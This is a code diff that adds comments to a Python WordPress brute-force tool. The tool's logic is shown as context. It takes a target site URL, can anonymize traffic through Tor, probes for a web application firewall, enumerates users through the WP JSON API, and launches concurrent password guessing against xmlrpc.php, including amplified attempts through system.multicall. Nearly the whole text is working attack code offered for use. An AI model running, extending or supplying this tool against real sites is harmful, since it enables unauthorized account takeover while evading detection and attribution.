@@ -398,13 +398,13 @@ async def brute_force_task(
 
     return False
 
-
 async def start_bruteforce_async(url, usernames, passwords, threads, use_tor=False):
-
+    # Initialize start time and total attempts
     start_time = [time.time()]
     total_attempts = [0]
     progress_print_interval = 0.5  # time interval for progress reports
 
+    # Set up the proxy connector if using Tor
     if use_tor:
         parsed_url = urlparse("socks5://127.0.0.1:9050")
         connector = ProxyConnector(
@@ -415,8 +415,10 @@ async def start_bruteforce_async(url, usernames, passwords, threads, use_tor=Fal
     else:
         connector = None
 
+    # Create an aiohttp session with the connector
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []
+        # Create brute force tasks for each username and password combination
         for username in usernames:
             for password in passwords:
                 task = asyncio.create_task(
@@ -432,10 +434,12 @@ async def start_bruteforce_async(url, usernames, passwords, threads, use_tor=Fal
                 )
                 tasks.append(task)
 
+        # Run all tasks concurrently
         await asyncio.gather(*tasks)
 
 
 async def start_multicall_async(url, usernames, passwords, session, use_tor=False):
+    # Attempt to exploit the multicall method
     response_text, response_time, response_status = await exploit_multicall(
         url, usernames, passwords, session
     )
@@ -464,12 +468,14 @@ async def start_multicall_async(url, usernames, passwords, session, use_tor=Fals
 
 async def check_for_waf(url, session, use_tor=False):
     try:
+        # Define headers for the request
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Accept-Language": "en-US,en;q=0.9",
             "Connection": "keep-alive",
         }
+        # Send a GET request to the URL
         async with session.get(url, headers=headers, timeout=15, ssl=False) as response:
             if response.status == 403:
                 logging.warning(f"WAF Detected with status {response.status} for {url}")
@@ -484,16 +490,20 @@ async def check_for_waf(url, session, use_tor=False):
 
 
 async def main():
+    # Print the banner
     banner.print_banner()
+    # Get the target URL from the user
     url = input(
         f"{Fore.YELLOW}Enter the target WordPress website URL (e.g., https://example.com): "
     )
+    # Ask the user if they want to use Tor
     use_tor = input(f"{Fore.YELLOW}Do you want to use Tor? (y/n): ").lower() == "y"
     if use_tor:
         print_colored_bold(
             f"{Fore.YELLOW}Using Tor to anonymize the requests", color="yellow"
         )
 
+    # Set up the proxy connector if using Tor
     if use_tor:
         parsed_url = urlparse("socks5://127.0.0.1:9050")
         connector = ProxyConnector(
@@ -504,12 +514,15 @@ async def main():
     else:
         connector = None
 
+    # Create an aiohttp session with the connector
     async with aiohttp.ClientSession(connector=connector) as session:
 
+        # Check for WAF detection
         waf_detected = await check_for_waf(url, session)
         if waf_detected:
             print(f"{Fore.YELLOW}WAF detected, proceed with caution")
 
+        # Check if xmlrpc.php is available
         if await check_xmlrpc_available(url + "/xmlrpc.php", session):
             print_colored_bold(
                 f"{Fore.GREEN}xmlrpc.php is available, proceeding with brute-force!",
@@ -519,6 +532,7 @@ async def main():
             print(f"{Fore.RED}xmlrpc.php is not available. Exiting...")
             return
 
+        # Ask the user if they want to list users from WP JSON API
         use_wp_api = input(
             f"{Fore.YELLOW}Do you want to list users from WP JSON API? (y/n): "
         ).lower()
@@ -531,6 +545,7 @@ async def main():
                 print(f"{Fore.RED}No users found from WP API.")
                 return
         else:
+            # Ask the user if they want to provide a username file or enter manually
             username_choice = input(
                 f"{Fore.YELLOW}Do you want to provide a username file or enter manually? (f/m): "
             ).lower()
@@ -543,6 +558,7 @@ async def main():
             else:
                 users = [input(f"{Fore.YELLOW}Enter a username: ")]
 
+        # Ask the user if they want to provide a password file or use default
         password_choice = input(
             f"{Fore.YELLOW}Do you want to provide a password file or use default (wppass.txt)? (f/d): "
         ).lower()
@@ -560,8 +576,10 @@ async def main():
                 )
                 return
 
+        # Get the number of threads to use from the user
         threads = int(input(f"{Fore.YELLOW}Enter the number of threads to use: "))
 
+        # Ask the user if they want to use system.multicall
         multicall_choice = input(
             f"{Fore.YELLOW}Do you want to use system.multicall? (y/n): "
         ).lower()
@@ -579,4 +597,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-    
